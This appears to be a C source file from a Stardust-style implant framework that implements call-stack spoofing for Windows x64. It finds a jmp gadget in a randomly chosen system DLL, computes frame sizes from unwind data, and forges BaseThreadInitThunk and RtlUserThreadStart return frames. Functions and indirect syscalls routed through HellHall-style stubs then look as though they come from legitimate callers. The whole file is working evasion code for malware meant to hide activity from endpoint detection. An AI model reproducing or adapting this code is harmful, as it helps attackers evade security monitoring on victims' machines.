#include <Spoof.h>

FUNC PVOID RandomModule()
{
    STARDUST_INSTANCE
    //(randomValue % (max - min + 1)) + min
    PVOID Mod;
    ULONG Val = (RandomNumber32() % 4);
    switch (Val)
    {
    case 0:
        Mod = Instance()->Modules.Kernel32;
        break;
    case 1:
        Mod = Instance()->Modules.Msvcrt;
        break;
    case 2:
        Mod = Instance()->Modules.Ntdll;
        break;
    case 3:
        Mod = Instance()->Modules.WinHTTP;
        break;
    default:
        Mod = Instance()->Modules.Kernel32;
        break;
    }
    return Mod;
}

FUNC ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase, StackFrame *stackFrame)
{
    NTSTATUS status;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;

    // [0] Sanity check incoming pointer.
    if (!pRuntimeFunction)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Loop over unwind info.
    // NB As this is a PoC, it does not handle every unwind operation, but
    // rather the minimum set required to successfully mimic the default
    // call stacks included.
    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
        // [2] Loop over unwind codes and calculate
        // total stack space used by target Function.
        switch (unwindOperation)
        {
        case UWOP_PUSH_NONVOL:
            // UWOP_PUSH_NONVOL is 8 bytes.
            stackFrame->totalStackSize += 8;
            // Record if it pushes rbp as
            // this is important for UWOP_SET_FPREG.
            if (operationInfo == 0x5)
            {
                stackFrame->pushRbp = TRUE;
                // Record when rbp is pushed to stack.
                stackFrame->countOfCodes = pUnwindInfo->CountOfCodes;
                stackFrame->pushRbpIndex = index + 1;
            }
            break;
        case UWOP_SAVE_NONVOL:
            // UWOP_SAVE_NONVOL doesn't contribute to stack size
            //  but you do need to increment index.
            index += 1;
            break;
        case UWOP_ALLOC_SMALL:
            // Alloc size is op info field * 8 + 8.
            stackFrame->totalStackSize += ((operationInfo * 8) + 8);
            break;
        case UWOP_ALLOC_LARGE:
            // Alloc large is either:
            // 1) If op info == 0 then size of alloc / 8
            // is in the next slot (i.e. index += 1).
            // 2) If op info == 1 then size is in next
            // two slots.
            index += 1;
            frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
            if (operationInfo == 0)
            {
                frameOffset *= 8;
            }
            else
            {
                index += 1;
                frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
            }
            stackFrame->totalStackSize += frameOffset;
            break;
        case UWOP_SET_FPREG:
            // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
            // that rbp is the expected value (in the frame above) when
            // it comes to spoof this frame in order to ensure the
            // call stack is correctly unwound.
            stackFrame->setsFramePointer = TRUE;
            break;
        default:
            status = STATUS_ASSERTION_FAILURE;
            break;
        }

        index += 1;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1))
        {
            index += 1;
        }
        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        return CalculateFunctionStackSize(pRuntimeFunction, ImageBase, stackFrame);
    }

    // Add the size of the return address (8 bytes).
    stackFrame->totalStackSize += 8;

    return stackFrame->totalStackSize;
Cleanup:
    return status;
}

FUNC ULONG CalculateFunctionStackSizeWrapper(PVOID ReturnAddress)
{
    STARDUST_INSTANCE
    NTSTATUS status;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;

    pRuntimeFunction = Instance()->Win32.RtlLookupFunctionEntry((DWORD64)ReturnAddress, &ImageBase, pHistoryTable);

    if (NULL == pRuntimeFunction)
    {
        status = STATUS_ASSERTION_FAILURE;
        return status;
    }

    // [2] Recursively calculate the total stack size for
    StackFrame stackFrame = {0};
    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase, &stackFrame);
}

FUNC PVOID Spoofer(PVOID pFunctionAddr, PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8)
{
    STARDUST_INSTANCE

    PVOID ReturnAddress = NULL;
    PRM p = {0};
    PRM ogp = {0};
    BYTE JmpPad[] = {0xFF, 0x23};

    p.trampoline = MmGadgetFind(RandomModule(), 0x200000, &JmpPad, sizeof(JmpPad));

    UINT_PTR uiBaseThreadInitThunk = (UINT_PTR)Instance()->Win32.BaseThreadInitThunk + 0x1d;

    p.BTIT_ss = (PVOID)CalculateFunctionStackSizeWrapper((PVOID)uiBaseThreadInitThunk);
    p.BTIT_retaddr = (PVOID)uiBaseThreadInitThunk;

    UINT_PTR uiRtlUserThreadStart = (UINT_PTR)Instance()->Win32.RtlUserThreadStart + 0x28;

    p.RUTS_ss = (PVOID)CalculateFunctionStackSizeWrapper((PVOID)uiRtlUserThreadStart);
    p.RUTS_retaddr = (PVOID)uiRtlUserThreadStart;

    p.Gadget_ss = (PVOID)CalculateFunctionStackSizeWrapper(p.trampoline);

    return Spoof(arg1, arg2, arg3, arg4, &p, pFunctionAddr, (PVOID)4, arg5, arg6, arg7, arg8);
}

FUNC PVOID SyscallSpoofer(PVOID ssn, PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8, PVOID arg9, PVOID arg10, PVOID arg11, PVOID arg12)
{
    STARDUST_INSTANCE

    PVOID ReturnAddress = NULL;
    PRM p = {0};
    PRM ogp = {0};
    BYTE JmpPad[] = {0xFF, 0x23};

    //(randomValue % (max - min + 1)) + min
    p.trampoline = MmGadgetFind(Instance()->Modules.Kernel32, 0x200000, &JmpPad, sizeof(JmpPad));

    UINT_PTR uiBaseThreadInitThunk = (UINT_PTR)Instance()->Win32.BaseThreadInitThunk + 0x1d; // ok

    p.BTIT_ss = (PVOID)CalculateFunctionStackSizeWrapper((PVOID)uiBaseThreadInitThunk);
    p.BTIT_retaddr = (PVOID)uiBaseThreadInitThunk;

    UINT_PTR uiRtlUserThreadStart = (UINT_PTR)Instance()->Win32.RtlUserThreadStart + 0x28; // ok

    p.RUTS_ss = (PVOID)CalculateFunctionStackSizeWrapper((PVOID)uiRtlUserThreadStart);
    p.RUTS_retaddr = (PVOID)uiRtlUserThreadStart;

    p.Gadget_ss = (PVOID)CalculateFunctionStackSizeWrapper(p.trampoline);
    p.ssn = ssn;

    // You can use any of the HellHall syscalls instead of NtClose.
    // It doesn't matter which one you choose, cuz its just needs syscall instruction.
    return Spoof(arg1, arg2, arg3, arg4, &p, Instance()->Syscall.NtClose.pInst, (PVOID)8, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12);
}
